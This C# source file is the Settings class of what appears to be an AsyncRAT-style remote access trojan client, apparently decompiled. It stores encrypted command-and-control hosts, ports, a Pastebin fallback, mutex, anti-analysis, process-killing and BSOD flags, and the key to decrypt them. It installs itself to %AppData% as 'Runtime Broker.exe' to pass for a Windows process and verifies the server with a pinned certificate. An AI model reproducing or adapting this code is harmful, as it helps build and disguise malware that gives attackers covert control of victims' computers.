using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Por_ts = "JK1lG9cFAFlngkHzc4QSh+NEnKyMxaJLXYl0gP6rDOVzUCKVaj/olCWB80+dVx34LTiWlmdztCOJ13HFqTAdHQ==";

	public static string Hos_ts = "5gSlP4bGvjBZJ3fV81tKRhxissW9t9gLZAMCdLnxmjc71AtdU6wfodcmfpnUbK5Rbe6QeveQ8u1ludHtPjkbzA==";

	public static string Ver_sion = "CyFHZSwN2WCALPRYPY/ADVHyUMq+Tn5ZWdthTR+BQK3DYomKhvhhhNMF9JnT7tH/hQs3XyBvEQdulSesww/vCA==";

	public static string In_stall = "qiB1xWgr1sDMI4OujvBhrqQ6fqR9FHy1txyFWMh2iZ9sazIBDehnFlZKeE6mKkWc3Udm7uRRnK2SPxsu8QDseQ==";

	public static string Install_Folder = "%AppData%";

	public static string Install_File = "Runtime Broker.exe";

	public static string Key = "aUk1UmhRZWcxbHVKNk1PaWNFOU9YeUM0UzJJRzVRdGg=";

	public static string MTX = "2fkdM+5+qLmz85/RILMbxgpUJ+iJNoW8SXMpmwolJQX3O587TwiUGYAN05Fc9AqroYDOb2rXuyGPc/gar9vK0j/A6A6yMh9KJCgcCJV12I4=";

	public static string Certifi_cate = "dMGv6VdPQHm2rwzEMa4CV9LCysrT8Aj3Nb5JVojPlBn3RRTO/ad9sQL0zScYD6wmbL0xK3NYDgnuDnu08BZR2RoQmXL4Sn7VNWUn7bZ47vqVdtrCAuS1nfSJJWjsnHQsCD2csPkUQXwlolg85B3Z/5k/Dh9HCl/zoak9PhAd8QCkYFnNOUGkDYNq+tpaVJkaqr0Gk8snB7EOj8inNrZXRf5z+o6WSiP0S/p+LPc2vNyPZyzrGSSr2c/Uo1mIyOyVcU9oA3fC3CEG+ix74IcfzIFaJrpmvsc14P5A0p4h2gtkCkGIepYAAI85yClapM68L4fJ1//FKo+dXPJ0DzG+eaADOp/4eQEHhRmp3/kHxeg+H/KdBhG26e0ett/aIGz2W+44x2g6Ry6/O6mX9ab7rYGivGBFvYYDREKp8ygTPd361qft+NdTeBrYH2X6DKYgaQwEn+9AuP1PJyvdC7nWLew/UUjed+chkzca0LTu3JsDtpklw+KkqX/52j6t47Mmkglr1Dim/BjwWa43BusWNbJyZIYb1JfKoBah0oA7ligXGf1loFSHLLo/QA/U9cKOQoJCdvMN2BuLQX90QB0AQ5fMAvzn+CZ1MWtdHZdkFlVpByLAbyT9JPQeeH4j7XI0Ny6uGlPhxYToVvKEK11cXipx9aV8fn+tnH8GPQA1n9BfVAhoWiMdfEqynCd7XMHdo7EAMuGU2q08uraCpKTlwiqHwimyWjER4BQyLVG7ImK5VjXow61IyDj3l6YtRQyBiVisq8q2lPAk5kvWeTebdC7KBDPB7wZ5mBaQa6xhRQxlOeTPUxHVvZMNSiNolZPW9JSFx5OFyAFqWr/YBpRFgDlwjjyEjL2ft2k8kdB/jGE9i0c/SPZUqnXnBMKRW8jzY4rzUe4ruiT14yMprPIHQHFIHNfpoV2P9+zXrl1u8ioWhVtvQW1g1msjiH2FOHHZFvZKNSnpc6nk5ovo2XAawJ8CegtJi2HPcYwP+bnWg3yARgOQzfcFEEq295G2fkYgnqnkfVkEwCEPuuo9Uj+qy20bDDRBw5i2MmS9A5gxnveffWMbwVi8UiujDSZ0WNrz";

	public static string Server_signa_ture = "gDI5Tj4EoVO7GU1/hyJgGkrQCFwEJKASDhQ/xFGZzEcw7Xmv5XPmriMc5fQFKYZDjCVfohs7MaPPUt/FitcuJxyJ9VG5duIplevfGfmQoNt/THloDvq3ETuTKLDtwS8I4VoEcVJYRrvC0uleDtbbo6XrjPmiSo/m7WFtXQPNKg44dAQsEAUrFKKeU/taKGs/fUUjDjgMCQr3aH52YLYjf540K0WWLwiZFhC9zgTc5oadGz09wZykYdR56JdxMWYVld+pXcc4q/bwsSfa7aWi5C5dLZxy9Zwrvk7D+i0WjHw=";

	public static X509Certificate2 Server_Certificate;

	public static Aes256 aes256;

	public static string Paste_bin = "9v+o+UmLLXF/MZAnmHpNNrJsFpP+3KZtC0vawGhzidiox9waTaurypcLrJh951Vvb4rBfxh2hcEiDOE3Qm6/D1uSlUroWp5FzijGFfg+Vtk=";

	public static string BS_OD = "p+tc8pWXTdHIJMIT1iGRBrhueaJ8QgI7j+qCpv1ugs4Qsj5pR9D2sqFlTVng5uJJ6t+ub2d4sCVKYEujDzG1HA==";

	public static string Hw_id = null;

	public static string De_lay = "1";

	public static string Group = "cx+UHNbGA+DI2ETvRefA0UiBQ4dVWsloo5IVGe0GbKh8YNdpHJi3Y72ogtP8WRRK9rgdtVTxjuD6b+1o0EwVEA==";

	public static string Anti_Process = "6ViMBJY0G97y0fcH08s6gAMZrtI3BAMUdercZ1YWUI+0VjnIadlPVWZPmggzdzZI+uAOUa1SD4qJCmYIGAo/jw==";

	public static string An_ti = "DUG7hyjN/x0YZAvJJEhd2xIfHxDVivB9z/nyX7wdmd0dJQuXkQlKVhpm7FuYUPZ/DEPdCLIHDT3EvVTlxVUTnQ==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Por_ts = aes256.Decrypt(Por_ts);
			Hos_ts = aes256.Decrypt(Hos_ts);
			Ver_sion = aes256.Decrypt(Ver_sion);
			In_stall = aes256.Decrypt(In_stall);
			MTX = aes256.Decrypt(MTX);
			Paste_bin = aes256.Decrypt(Paste_bin);
			An_ti = aes256.Decrypt(An_ti);
			Anti_Process = aes256.Decrypt(Anti_Process);
			BS_OD = aes256.Decrypt(BS_OD);
			Group = aes256.Decrypt(Group);
			Hw_id = HwidGen.HWID();
			Server_signa_ture = aes256.Decrypt(Server_signa_ture);
			Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
			using SHA256Managed sHA256Managed = new SHA256Managed();
			return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
